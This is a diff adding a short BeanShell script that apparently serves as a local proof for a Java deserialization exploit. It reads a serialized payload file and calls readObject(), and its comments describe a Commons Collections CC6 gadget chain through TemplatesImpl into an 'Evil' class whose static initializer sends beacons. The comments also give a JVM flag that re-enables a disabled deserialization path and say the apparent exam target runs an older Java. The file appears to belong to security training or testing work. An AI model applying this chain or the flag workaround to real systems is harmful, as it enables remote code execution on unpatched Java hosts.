@@ -1,0 +1,20 @@
+/* LocalDeser.bsh - local deserialize proof for translet_raw.bin.
+ * Usage (from the scripts dir):
+ *   java -Djdk.xml.enableTemplatesImplDeserialization=true -cp "<utils-bundle.jar>;." bsh.Interpreter LocalDeser.bsh
+ * NOTE: the -D flag is REQUIRED on this host's JRE 1.8.0_511 (newer 8u builds disable
+ * TemplatesImpl deserialization by default). The exam target runs an older Java 8 where
+ * the default is to allow it. readObject() triggers the CC6 chain ->
+ * TemplatesImpl.newTransformer() -> Evil.<clinit> -> beacons; check beacon_local.log.
+ * Known post-trigger artifact: AbstractTranslet.postInitialization() NPEs AFTER the
+ * beacons already fired - harmless (static initializer runs first by JLS ordering).
+ */
+
+byte[] b = java.nio.file.Files.readAllBytes(new java.io.File("translet_raw.bin").toPath());
+java.lang.System.err.println("[*] translet_raw.bin bytes=" + b.length
+    + " magic=" + (b[0] & 0xff) + " " + (b[1] & 0xff) + " " + (b[2] & 0xff) + " " + (b[3] & 0xff));
+
+java.io.ObjectInputStream ois = new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(b));
+Object o = ois.readObject();
+ois.close();
+java.lang.System.err.println("[+] deser OK: " + o.getClass().getName());
+return;
